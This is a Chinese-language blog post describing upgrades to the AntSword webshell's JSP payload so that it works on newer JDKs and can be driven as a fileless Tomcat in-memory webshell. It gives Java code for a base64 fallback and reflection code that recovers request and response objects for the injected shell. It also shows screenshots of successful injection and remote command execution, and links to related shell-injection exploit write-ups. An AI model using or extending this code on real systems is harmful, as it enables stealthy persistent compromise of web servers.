# 蚁剑改造计划之支持内存马


<meta name="referrer" content="no-referrer" />

## 前言

最近因为各种事情太忙了，博客也很久没有更新了。今天暂且先水一篇。

前几天发了一版新的蚁剑JSP一句话的payload，这篇文章记录一下更新的细节。

## 1. 兼容高版本JDK

这个没啥好说的，就是base64解码的问题。在jdk9开始移除了sun.misc这个包，导致原有的`sun.misc.BASE64Decoder`没法继续使用，取而代之的是`java.util.Base64`这个类。

解决办法就是两个都试一下，看哪个能解码成功，核心代码如下

```
public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
```

## 2. 兼容Tomcat内存马

这个问题可以掰扯一下。很多文章都提到了冰蝎或者蚁剑连接内存马的问题。

除了由于写法问题而导致的各种乱七八糟的问题以外，其中主要的一个问题是冰蝎在入口处采用了pageContext这个类来获取request response session对象，本人以冰蝎为原型实现的蚁剑JSP一句话同样采用了pageContext作为入口。但是以filter型内存马为例，doFilter中三个参数分别是ServletRequest，ServletResponse，FilterChain，并不存在pageContext这个东西。

那么大体上有三种解决办法：

1. 自己声明一个pageContext类，在里面实现对应的request跟response的getter setter。[冰蝎改造之不改动客户端=>内存马](https://mp.weixin.qq.com/s/r4cU84fASjflHrp-pE-ybg)。
2. 改写冰蝎的入口为request+response，不再采用pageContext作为入口。但是弊端就是不能再用equals了，要重新写一个方法用反射调用。[冰蝎改造之适配基于tomcat Filter的无文件webshell](https://xz.aliyun.com/t/7899)

1. 采用蚁剑原来的Custom模式，把恶意函数直接通过字节码打进去，然后通过方法名调用。不过由于直接编译恶意函数的字节码较大会超过最大长度限制，一般要先写入目标然后配合URLClassLoader才能使用。[使用WebLogic CVE-2020-2883配合Shiro rememberMe反序列化一键注入蚁剑shell](https://xz.aliyun.com/t/8202)

以上的这些方法可以是可以，但是不够优雅。

回想我们最开始的问题，为什么要用pageContext，是为了拿到当前请求的上下文，更精确一点就是输入输出：request,response。经过实际调试可以发现：

在request中本身就包含了当前的response，同样response中也包含了当前的request。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900381846-89cb17b8-c17d-41ec-8995-12770643b05a.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900381943-fb673234-5711-42a1-9e93-01546372eeae.png)

虽然蚁剑没有用到session对象，但是需要的时候也可以通过request来获取。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900382026-9ad5c7aa-9054-4ccf-9629-f2fed297a955.png)

也就是通过request或者response任意一个就能完全代替pageContext，这也是在新版payload中采取的方案。

核心代码如下

```
if (obj instanceof PageContext) {
            PageContext page = (PageContext) obj;
            request = (HttpServletRequest) page.getRequest();
            response = (HttpServletResponse) page.getResponse();
        } else if (obj instanceof HttpServletRequest) {
            request = (HttpServletRequest) obj;
            try {
                Field req = request.getClass().getDeclaredField("request");
                req.setAccessible(true);
                HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                Field resp = request2.getClass().getDeclaredField("response");
                resp.setAccessible(true);
                response = (HttpServletResponse) resp.get(request2);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (obj instanceof HttpServletResponse) {
            response = (HttpServletResponse) obj;
            try {
                Field resp = response.getClass().getDeclaredField("response");
                resp.setAccessible(true);
                HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
                Field req = response2.getClass().getDeclaredField("request");
                req.setAccessible(true);
                request = (HttpServletRequest) req.get(response2);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
```

在equals中收到一个对象后，会依次判断是否是PageContext/HttpServletRequest/HttpServletResponse，然后根据情况拿到request跟response，从而实现对内存马的兼容。

## 实现效果

测试环境

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900382124-c7288ee4-20c8-4a56-b95a-2da3f946b3ef.png)

在equals中填入request对象

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900382212-b2e350f0-c7e9-4bb7-82c1-e529b07fb6fb.png)

访问内存马，一片空白说明注入成功。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900382311-227294c9-3698-4088-9ae9-561de84c625a.png)

访问任意路径即可连接。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900382405-2f91f1b3-3f34-4f0d-a7b8-bcc6cd519562.png)

正常执行命令，完美解决问题。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900382538-b1ebe2ae-b87a-45cc-b7f3-183bab14fe30.png)
